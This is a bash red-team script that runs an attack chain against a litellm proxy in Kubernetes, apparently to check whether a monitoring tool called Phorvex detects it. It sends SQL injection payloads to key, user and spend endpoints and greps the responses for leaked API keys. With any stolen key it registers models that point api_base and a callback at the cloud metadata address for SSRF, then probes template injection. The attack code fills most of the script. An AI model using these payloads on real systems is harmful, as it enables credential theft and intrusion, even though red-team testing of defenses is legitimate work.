#!/usr/bin/env bash
# batchl.sh — litellm battery: V4 (pre-auth SQLi key-dump attempt), V5 (api_base SSRF),
# V15 (malicious route implant), V12 (SQLi->SSTI RCE chain).
# litellm IS under a policy (litellm-defense, rotate-only, reactiveOnly) — so the observable
# is: does Phorvex react to these? (No detector fires for any of them -> expected silence,
# which is itself the finding: watched-but-undetected = no reaction.)
# If V4 lands (keys), the downstream three chain; if not, they're blocked-at-auth (honest).
set -uo pipefail
NSL=litellm; NSX=phorvex-system; CTRL=phorvex-phorvex
OUT=/tmp/px-batchl; mkdir -p "$OUT"
kubectl get pods -n $NSL -o jsonpath='{range .items[*]}{.metadata.name} uid={.metadata.uid}{"\n"}{end}' | tee "$OUT/uids-before.txt"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ); date -Is

kubectl port-forward -n $NSL svc/litellm 14000:4000 >/dev/null 2>&1 &
PF=$!; trap 'kill $PF 2>/dev/null' EXIT
sleep 4
B=http://127.0.0.1:14000

echo "=== recon: litellm surface ==="
{
for p in / /health /health/readiness /version /get/version; do
  printf "GET %s -> " "$p"; curl -s --max-time 10 -o /tmp/ll-resp -w "%{http_code}" "$B$p"; printf "  "; head -c 200 /tmp/ll-resp; echo
done
echo "-- unauth /v1/models (expect 401):"
curl -s --max-time 10 -o /dev/null -w "%{http_code}\n" "$B/v1/models"
} | tee "$OUT/recon.txt"

echo; echo "=== route surface (openapi) — looking for SQLi-prone query params ==="
curl -s --max-time 15 "$B/openapi.json" -o "$OUT/openapi.json"
jq -r '.paths | keys[]' "$OUT/openapi.json" 2>/dev/null | grep -iE "key|token|user|team|model|prompt|config|spend" | head -30 | tee "$OUT/routes.txt"

echo; echo "=== V4: pre-auth SQLi attempts (CVE-2026-42208) ==="
{
# try the classic unauth surfaces with SQLi-shaped params; bounded set
for u in \
  "/key/list?user_id=1'%20OR%20'1'='1" \
  "/user/info?user_id=1'%20OR%20'1'='1--" \
  "/key/list?key_alias=x' UNION SELECT 1--" \
  "/spend/logs?user_id=1' OR '1'='1" \
  "/model/info?model=x' OR '1'='1" ; do
  printf "GET %s -> " "$u"
  curl -s --max-time 10 -o /tmp/ll-sqli -w "%{http_code}" "$B$u"; printf "  "; head -c 150 /tmp/ll-sqli | tr -d '\n'; echo
done
} | tee "$OUT/v4.txt"
KEYS=""
# naive check: anything that looks like a leaked key in any response
grep -oE 'sk-[A-Za-z0-9_-]{8,}' /tmp/ll-sqli 2>/dev/null | head -3 | sed 's/\(sk-....\).*/\1…REDACTED/' | tee "$OUT/v4-keys.txt"

echo; echo "=== V5/V15/V12: chained moves (need a valid key — from V4) ==="
MASTER=$(grep -oE 'sk-[A-Za-z0-9_-]{8,}' /tmp/ll-sqli 2>/dev/null | head -1 || true)
if [ -z "$MASTER" ]; then
  echo "V4 did not yield a key on this build -> V5 (api_base SSRF), V15 (route implant), V12 (SSTI) are BLOCKED-AT-AUTH (chain sound per audit; needs the SQLi to land first)" | tee "$OUT/v5-v15-v12.txt"
else
  echo "key obtained (redacted) — attempting chained moves with it" | tee "$OUT/v5-v15-v12.txt"
  echo "-- V5: register a model with api_base=http://169.254.169.254/latest/meta-data (SSRF to IMDS):" | tee -a "$OUT/v5-v15-v12.txt"
  curl -s --max-time 15 -X POST "$B/model/new" -H "Authorization: Bearer $MASTER" -H 'Content-Type: application/json' \
    -d '{"model_name":"rt-ssrf","litellm_params":{"model":"gpt-3.5-turbo","api_base":"http://169.254.169.254/latest/meta-data"}}' | head -c 300 | tee -a "$OUT/v5-v15-v12.txt"; echo | tee -a "$OUT/v5-v15-v12.txt"
  echo "-- V15: same door with a callback URL (persistent route implant):" | tee -a "$OUT/v5-v15-v12.txt"
  curl -s --max-time 15 -X POST "$B/model/new" -H "Authorization: Bearer $MASTER" -H 'Content-Type: application/json' \
    -d '{"model_name":"rt-implant","litellm_params":{"model":"gpt-3.5-turbo","input_callback":"http://169.254.169.254/rt"}}' | head -c 300 | tee -a "$OUT/v5-v15-v12.txt"; echo | tee -a "$OUT/v5-v15-v12.txt"
  echo "-- V12: /prompts/test SSTI:" | tee -a "$OUT/v5-v15-v12.txt"
  curl -s --max-time 15 -X POST "$B/prompts/test" -H "Authorization: Bearer $MASTER" -H 'Content-Type: application/json' \
    -d '{"prompt":"{{7*7}}"}' | head -c 300 | tee -a "$OUT/v5-v15-v12.txt"; echo | tee -a "$OUT/v5-v15-v12.txt"
  echo "-- cleanup implanted models:" | tee -a "$OUT/v5-v15-v12.txt"
  curl -s --max-time 15 -X POST "$B/model/delete" -H "Authorization: Bearer $MASTER" -H 'Content-Type: application/json' -d '{"id":"rt-ssrf"}' | head -c 120; echo
  curl -s --max-time 15 -X POST "$B/model/delete" -H "Authorization: Bearer $MASTER" -H 'Content-Type: application/json' -d '{"id":"rt-implant"}' | head -c 120; echo
fi

echo; echo "=== Phorvex reaction window (litellm IS watched, but nothing here fires a detector) ==="
kubectl logs -n $NSX deploy/$CTRL --since-time="$T0" 2>/dev/null | grep -iE "litellm" | tail -8 | tee "$OUT/phorvex-reaction.txt"
echo "(empty = zero Phorvex attention despite a watched policy — no detector, no event, no reaction)"
kubectl get pods -n $NSL -o jsonpath='{range .items[*]}{.metadata.name} uid={.metadata.uid} phase={.status.phase}{"\n"}{end}' | tee "$OUT/uids-after.txt"
kill $PF 2>/dev/null
echo done
